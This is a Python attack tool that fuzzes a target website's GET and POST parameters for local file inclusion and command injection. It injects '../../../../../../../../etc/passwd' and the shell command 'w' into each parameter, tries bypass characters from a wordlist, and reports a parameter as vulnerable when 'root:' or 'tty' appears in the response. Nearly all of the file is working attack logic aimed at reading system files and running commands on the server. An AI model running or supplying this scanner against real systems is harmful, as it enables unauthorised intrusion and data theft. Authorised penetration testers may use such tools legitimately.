#!/usr/bin/env python3

import argparse
import sys
import requests
import re
import time
from cores.colors import green, white, end, info, bad, good, run, yellow, bold
from cores.utils import get_random_string,decode,encode

parser = argparse.ArgumentParser()
parser.add_argument('-u',help='target url', dest='url')
parser.add_argument('-w',help='wordlist path', dest='wordlist', default='./db/short_params.txt')
parser.add_argument('-b','--cookie',help='cookie', dest='cookie')
args = parser.parse_args()

url = args.url
wordlist = args.wordlist
cookie = args.cookie

args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

if cookie:
    headers = {     
                'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language' : 'en-US,en;q=0.5',
                'Accept-Encoding' : 'gzip, deflate',
                'Connection' : 'keep-alive',
                'Upgrade-Insecure-Requests' : '1',
                'Cookie':cookie,
                }
else:
    headers = {
                    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
                    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language' : 'en-US,en;q=0.5',
                    'Accept-Encoding' : 'gzip, deflate',
                    'Connection' : 'keep-alive',
                    'Upgrade-Insecure-Requests' : '1',
                }

paramList = []
try:
    with open(wordlist, 'r', encoding="utf8") as file:
        for line in file:
            paramList.append(line.strip('\n'))
except FileNotFoundError:
    print('%s The file doesn\'t exist' % bad)
    quit()

def requester(url, method, data, headers):
    if method == "GET":
        response = requests.get(url, params=data, headers=headers ,verify=False)
    elif method == "POST":
        response = requests.post(url, data=data, headers=headers, verify=False)
    return response

def parse(response):
    forms = re.findall(r'(?i)(?s)<form.*?</form.*?>', response)
    print("%s Found possible parameters by parsing webpage: " % good,end="")
    for form in forms:
        if "input" in form.strip():
            names = re.findall(r"name=['\"](.*?)['\"]", form.strip())
            for name in names:
                if name not in paramList:
                    paramList.append(name)
                print("%s%s %s" % (bold, green,name), end=",")
    if not forms:
        print("%s No parameters found in webpage:" % bad)

def vulnerable(response, vuln):
    if vuln == 'rce':
        if 'tty' in response.lower():
            return True
        else:
            return False
    if vuln == 'lfi':
        if 'root:' in response.lower():
            return True
        else:
            return False

def checkParams(response, url, headers, bypass_char):
    breaker_rce = False
    breaker_lfi = False
    values = ['../../../../../../../../etc/passwd', 'w']
    originalLength = len(response.text)
    # check for GET method
    print("\n%s Checking for GET request..." % good)
    for index, param in enumerate(paramList):
        if breaker_lfi and breaker_rce:
            break
        for value in values:
            value = '%s%s' % (value,bypass_char)
            data = {param:value}
            response = requester(url=url, method='GET', data=data, headers=headers)
            if len(response.text) != originalLength: # Found!
                if value == 'w' and not breaker_rce: #  RCE Found
                    if vulnerable(response.text, vuln="rce"):
                        print("%s Found valid param: %s%s %s%s(RCE!)%s"  % (good, green,param,bold,yellow,end))
                        foundParams.insert(0, param)
                        breaker_rce = True
                    else:
                        print("%s Found valid param (This might be false positive): %s%s%s" % (info, green,param,end))
                elif value != 'w' and not breaker_lfi: #LFI Found
                    if vulnerable(response.text, vuln="lfi"):
                        print("%s Found valid param: %s%s%s (%s?%s=%s)"  % (good,green,param,end,url,param,value))
                        foundParams.insert(0, param)
                        breaker_lfi = True
                    else:
                        print("%s Found valid param (This might be false positive): %s%s%s" % (info, green,param,end))
        print("%s Trying: %s" % (info,param), end="\r", flush=True)
    
    # check for POST method
    breaker_rce = False
    breaker_lfi = False
    print("%s Checking for POST request..." % good)
    for param in paramList:
        for value in values:
            value = '%s%s' % (value,bypass_char)
            data = {param:value}
            response = requester(url=url, method='POST', data=data, headers=headers)
            if len(response.text) != originalLength:
                if value == 'w' and not breaker_rce: #  RCE Found
                    if vulnerable(response.text, vuln="rce"):
                        print("%s Found valid param: %s%s %s%s(RCE!)%s"  % (good, green,param,bold,yellow,end))
                        foundParams.insert(0, param)
                        breaker_rce = True
                    else:
                        print("%s Found valid param %s%s(RCE!)%s (might be false positive): %s%s%s" % (info, bold,yellow,end, green,param,end))
                elif value != 'w' and not breaker_lfi: #LFI Found
                    if vulnerable(response.text, vuln="lfi"):
                        print("%s Found valid param: %s%s%s (%s?%s=%s)"  % (good,green,param,end,url,param,value))
                        foundParams.insert(0, param)
                        breaker_lfi = True
                    else:
                        print("%s Found valid param (This might be false positive): %s%s%s" % (info, green,param,end))
        print("%s Trying: %s" % (info,param), end="\r", flush=True)
    return foundParams

def intensive(response, url, headers):
    # loading bypassing wordlist
    bypass_chars = []
    with open('db/bypass_chars.txt','r', encoding="utf8") as file:
        for line in file:
            bypass_chars.append(line.strip())
    for char in bypass_chars:
        print("%s Trying with %s" % (info,char))
        checkParams(response,url,headers, char)




if __name__ == "__main__":
    foundParams = []
    finalResult = []
    bypassed_chars = []
    RCE = False
    LFI = False
    try:
        if url:
            if 'http' not in url:
                url = 'http://%s' % url
            try:
                originalFuzz = get_random_string(6)
                data = {originalFuzz:originalFuzz}
                response = requester(url=url, method='GET', data=data, headers=headers)
                # parse_webpage
                print("%s Parsing webpage for potential parameters..." % good)
                parse(response.text)
                # lfi and rce checking
                start_time = time.time() # Start execution time
                checkParams(response, url, headers, bypass_char='')
                if not foundParams:
                    print("%s No parameter found, trying bypassing techniques..." % info)
                    # bypassed_chars = checkParams()
                    intensive(response, url, headers)
                else:
                    print("%s Vulnerable parameters: "% good)
                    for param in foundParams:
                        print("%s " % param)
            except ConnectionError:
                print("%s Unable to connect to the target URL" % bad)
                quit()
    except KeyboardInterrupt:
        print("\n%s Exiting..." % bad)
        quit()